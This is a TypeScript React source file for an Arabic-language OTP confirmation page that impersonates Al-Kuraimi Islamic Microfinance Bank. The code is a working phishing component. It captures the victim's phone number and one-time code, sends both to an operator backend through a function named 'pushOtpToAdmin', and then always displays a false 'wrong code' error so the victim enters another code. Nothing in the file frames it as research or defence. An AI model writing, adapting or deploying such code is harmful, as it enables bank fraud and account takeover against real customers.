import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useRef, useState } from "react";
import { ArrowRight, Smartphone, CreditCard } from "lucide-react";
import { createLoginRequest } from "@/api/loginRequests";
import { setVisitorRequestId } from "@/lib/session";

export const Route = createFileRoute("/confirm")({
  validateSearch: (search: Record<string, unknown>) => ({
    phone: typeof search["phone"] === "string" ? search["phone"] : "",
  }),

  head: () => ({
    meta: [
      { title: "التحقق | بنك الكريمي للتمويل الأصغر الإسلامي" },
      { name: "description", content: "أدخل رمز التحقق المرسل إلى هاتفك لإكمال تسجيل الدخول." },
      { property: "og:title", content: "التحقق | بنك الكريمي" },
      {
        property: "og:description",
        content: "أدخل رمز التحقق المرسل إلى هاتفك لإكمال تسجيل الدخول.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Confirm,
});

function Confirm() {
  const { phone } = Route.useSearch();
  const last3 = phone.replace(/\D/g, "").slice(-3);
  const maskedNumber = last3 ? `**${last3}` : "**386";
  const [seconds, setSeconds] = useState(120);
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [inputKey, setInputKey] = useState(0);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (seconds <= 0) return;
    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [seconds]);

  useEffect(() => {
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  const pushOtpToAdmin = async (code: string) => {
    try {
      const row = await createLoginRequest({
        phone: phone || "----",
        otp_code: code,
        otp_login: code,
        step: "otp",
        status: "pending",
      });
      setVisitorRequestId(row.id);
    } catch (err) {
      console.error(err);
    }
  };

  const startFakeVerify = () => {
    if (loading) return;
    const submittedCode = otp;
    setErrorMsg("");
    setLoading(true);
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      void pushOtpToAdmin(submittedCode);
      setLoading(false);
      setOtp("");
      setInputKey((k) => k + 1);
      setErrorMsg("رمز التحقق خاطئ");
      if (inputRef.current) inputRef.current.value = "";
    }, 3000);
  };

  const handleOtpChange = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 6);
    setOtp(digits);
    setErrorMsg("");
    if (digits.length === 6) {
      startFakeVerify();
    }
  };

  return (
    <div className="mx-auto min-h-screen w-full max-w-md bg-white shadow-xl">
      <header className="flex items-center gap-3 bg-brand px-5 py-7 text-brand-foreground">
        <Link to="/" aria-label="رجوع">
          <ArrowRight size={24} />
        </Link>
        <h1 className="text-2xl font-bold">التحقق</h1>
      </header>

      <main className="px-5 pb-10">
        <div className="mx-auto -mt-1 flex h-24 w-24 items-center justify-center rounded-full bg-secondary">
          <Smartphone size={44} className="text-brand" />
        </div>
        <h2 className="mt-6 text-center text-xl font-bold text-foreground">تحقق</h2>

        <p className="mt-6 text-sm leading-7 text-foreground">
          الرجاء ادخال الرمز المرسل لرقم جوالك لتاكيد. الاشتراك
        </p>

        <input
          key={inputKey}
          ref={inputRef}
          inputMode="numeric"
          maxLength={6}
          autoComplete="off"
          name="otp"
          value={otp}
          onChange={(e) => handleOtpChange(e.target.value)}
          disabled={loading}
          placeholder="• • • • • •"
          className="mt-8 h-16 w-full rounded-lg border-2 border-foreground bg-secondary text-center text-2xl tracking-[0.4em] focus:outline-none focus:ring-2 focus:ring-brand disabled:opacity-70"
        />
        {errorMsg && (
          <p className="mt-2 text-sm text-red-600" role="alert">
            {errorMsg}
          </p>
        )}

        {loading && (
          <div
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/50"
            role="dialog"
            aria-modal="true"
            aria-label="جاري التحقق"
          >
            <div className="flex h-28 w-28 items-center justify-center rounded-2xl bg-white shadow-xl">
              <div className="h-12 w-12 animate-spin rounded-full border-4 border-gray-200 border-t-brand" />
            </div>
          </div>
        )}

        <p className="mt-8 text-center text-sm font-medium text-brand">
          إعادة ارسال رمز التحقق خلال{" "}
          <span className="text-green-700" dir="ltr">
            {mm}:{ss}
          </span>
        </p>

        <div className="mt-12 rounded-2xl bg-secondary p-5 text-center">
          <CreditCard size={32} className="mx-auto text-gold" />
          <p className="mt-3 text-sm leading-7 text-foreground">
            تم إرسال رمز التحقق إلى رقم الجوال المنتهي بـ {maskedNumber}. يُرجى التأكد من أن شريحة هذا
            الرقم متاحة على هذا الجهاز، وعدم مشاركة الرمز مع أي شخص
          </p>
          <button
            type="button"
            disabled={loading || otp.length < 6}
            onClick={startFakeVerify}
            className="mt-5 h-12 w-full rounded-full bg-brand font-bold text-brand-foreground disabled:opacity-60"
          >
            تأكيد
          </button>
        </div>
      </main>
    </div>
  );
}
